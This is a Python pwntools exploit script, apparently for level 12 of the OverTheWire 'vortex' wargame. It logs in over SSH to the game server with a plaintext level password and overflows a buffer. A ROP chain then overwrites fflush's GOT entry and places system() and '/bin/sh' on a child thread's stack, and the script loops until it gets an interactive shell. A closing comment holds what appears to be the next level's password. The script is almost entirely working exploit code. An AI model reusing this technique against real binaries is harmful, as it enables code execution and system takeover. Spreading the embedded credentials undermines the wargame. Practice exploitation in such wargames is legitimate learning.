from pwn import *
from random import randint
from time import sleep
from pwnhelper import *


local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
LOCAL = None


def pad(s, slen):
    return s+b"B"*(slen-len(s))


def connect(level, password, init=True):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global LOCAL
    compose_download_paths(level)
    port = 2228
    connected = False
    s = None
    while not connected:
        try:
            s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
            connected = True
            log.info("connected")
            if init:
                s.libs(remote_binary, local_dir)
        except Exception as e:
            log.info("ssh connection attempt failed")
            print("error: {0}".format(e))
            sleep(randint(1, 5))
    load_downloaded_files()
    LOCAL = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex"+level
    return s


# function of local testing vm
def connect_to_local(level, password, remote=True):
    global CWD
    global LOCAL
    global BINARY_PATH
    if remote:
        connect(level, password)
    else:
        compose_download_paths(level)
    s = ssh("kali", "127.0.0.1", keyfile="/home/kali/.ssh/id_rsa", cache=True)
    CWD = "/vortex/"+level
    BINARY_PATH = "/vortex/vortex" + level
    LOCAL = True
    return s

def load_downloaded_files():
    global elf
    global libc
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"

def compose_download_paths(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"
    log.info(f"cloned_binary: {local_binary}")


def to_clipboard(data):
    # from tkinter import Tk
    # r = Tk()
    # r.clipboard_clear()
    # r.clipboard_append(data)
    # r.update()  # now it stays on the clipboard after the window is closed
    # r.destroy()
    # from subprocess import Popen, PIPE
    # xsel = Popen(['xsel', '-bi'], stdin=PIPE)
    # xsel.communicate(input=bytes(data, "utf-8"))
    write("/tmp/clip", bytes(data, "utf-8"))
    # process("gnome-terminal -- cat /tmp/clip | copy", shell=True)


# what if payload containts ' -> need to be masked
def update_remote_script_and_local_gdb_script(payload, exit_prog=True):
    remote_setup_script_path = local_dir + "/vortex/remote-setup.py"
    gdb_script_path = local_dir + "/vortex/gdb.script"
    script = read(remote_setup_script_path).decode("utf-8")

    # new_payload_line = "payload = \"" + codecs.decode(payload, 'UTF-8') + "\"\n"
    new_payload_line = "payload = " + str(payload) + "\n"

    updated_script = ""
    updated_gdb_script = ""
    copy_gdb_script = False
    for line in script.split("\n"):
        # update payload line
        if "payload = b" in line:
            updated_script += new_payload_line
        else:
            updated_script += line+"\n"
        # collect gdb script and write to local file to keep them in sync
        if copy_gdb_script:
            updated_gdb_script += line+"\n"
        if "shell echo done" in line:
            copy_gdb_script = False
        if "gdb_script = \'\'\'" in line:
            copy_gdb_script = True

    # log.info(f"updated_gdb_script: {updated_gdb_script}")

    write(remote_setup_script_path, bytes(updated_script, "utf-8"))
    write(gdb_script_path, bytes(updated_gdb_script, "utf-8"))
    to_clipboard(updated_script)
    if exit_prog:
        exit(0)


# s = connect_to_local("12", "nKV95q]dx", remote=False)
s = connect("12", "nKV95q]dx")

# alpha = string.ascii_lowercase
# sleep_plt = 0x80484e0


log.info("############################################################################################################################################################")
log.info("# FIND OFFSET TO RET ADR")
log.info("############################################################################################################################################################")


# payload = b""
# payload += b"A"*buf_size
# payload += bytes(alpha, "utf-8")

# write("/tmp/docgil", payload)
# s.upload("/tmp/docgil", "/tmp/docgil")
#
# s.process([BINARY_PATH, payload])
# 68676665

log.info("############################################################################################################################################################")
log.info("# REDIRECT CODE EXECUTION")
log.info("############################################################################################################################################################")

# tested
libc_base = 0xf7e07000
fflush_got = 0x804a010
sleep_plt = 0x80484e0
system_adr = 0xf7fc3eb0
binsh_adr = libc_base + next(libc.search(b"/bin/sh"))
buf_size = 1032

# will not change bc diff thread that has nothing to do with input!
# when calling fflush
child_esp = 0xf7e05330
esp_off = 0x1c

# those change with payload size (stack moves)
# buf_adr = 0xffffd5f0
saved_bp = 0xffffd9e8


def rop_write_32_bit_to_adr(value, target_adr):
    assert len(value) == 4
    chain = b""
    pop_adr_into_eax = libc_base + 0x00024628
    log.info("pop_adr_into_eax: " + hex(pop_adr_into_eax))
    chain += pack(pop_adr_into_eax, 32)
    chain += pack(target_adr, 32)

    pop_value_into_ecx = libc_base + 0x00053c33
    log.info("pop_value_into_ecx: " + hex(pop_value_into_ecx))
    chain += pack(pop_value_into_ecx, 32)
    chain += value
    mov = libc_base + 0x0002da7f    # mov dword ptr [eax], ecx ; ret
    log.info("mov: " + hex(mov))
    chain += pack(mov, 32)
    return chain


def rop_delay_execution():
    chain = b""
    # for i in range(n):
    #     # 0x00125c56 : push eax ; ret
    #     # chain += pack(libc_base + 0x00125c56, 32)
    #     # # 0x00024628 : pop eax ; ret
    #     # chain += pack(libc_base + 0x00024628, 32)
    #
    #
    #     # 0x000d36db : sub cl, ch ; ret
    #     chain += pack(libc_base + 0x000d36db, 32)
    #     # 0x00033597 : sub eax, edx ; ret
    #     # chain += pack(libc_base + 0x00033597, 32)

    nano_sleep = 0xf7fc3420

    chain += pack(nano_sleep, 32)
    chain += b"RRRR"  # ret adr for sleep
    chain += pack(0x1dcd6500)
    # chain += pack(0x59682f00)
    return chain

'''
parent rop will create this child stack:
p:fflusharg
…
…
…
p+0x1c: ...
p+0x20: ...
p+0x24: ...
p+0x28: ...
p+0x2c: system
p+0x30: ….
p+0x34: binshpointer

p = child_esp
'''
def create_parent_rop():
    # parents ROP
    parent_rop = b""
    # fflush will jump to our child_rop chain (first gadget is add esp 0x1c; pop...)
    child_esp_offed = child_esp + esp_off
    log.info("child_esp_offed: " + hex(child_esp_offed))

    # parent_rop += rop_delay_execution()

    parent_rop += pack(saved_bp, 32)
    # reduced 4 bc esp got reduced by 4 by leaving plt.got
    parent_rop += rop_write_32_bit_to_adr(pack(system_adr, 32), child_esp+0x2c - 4)
    parent_rop += rop_write_32_bit_to_adr(pack(binsh_adr, 32), child_esp+0x34 - 4)

    # 0x080487b9 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    parent_rop += rop_write_32_bit_to_adr(pack(0x080487b9, 32), fflush_got)

    # make parent thread sleep forever
    parent_rop += pack(sleep_plt, 32)
    parent_rop += b"RRRR"  # ret adr for sleep
    parent_rop += pack(0x11111111)

    # we have to hit the child rop spot on
    parent_rop_len = len(parent_rop)
    log.info(f"parent_rop_len: {parent_rop_len}")
    log.info("remember seperator -> parentrop +4 = childrop")
    return parent_rop


payload = b""
payload += b"A"*buf_size
payload += create_parent_rop()


log.info(f"payload: {payload}")
log.info(f"payload len: {len(payload)}")


write("/tmp/docgil", payload)
update_remote_script_and_local_gdb_script(payload, exit_prog=False)

while True:
    io = s.process(["env", "-i", BINARY_PATH, payload])
    shell = check_for_shell(io, recv_check_timeout=1.5, always_recvs=True, control_text=b"$")
    if shell:
        io.interactive()
        break
# while True:
#     log.info(io.recv(timeout=100))


# jMyg12=nB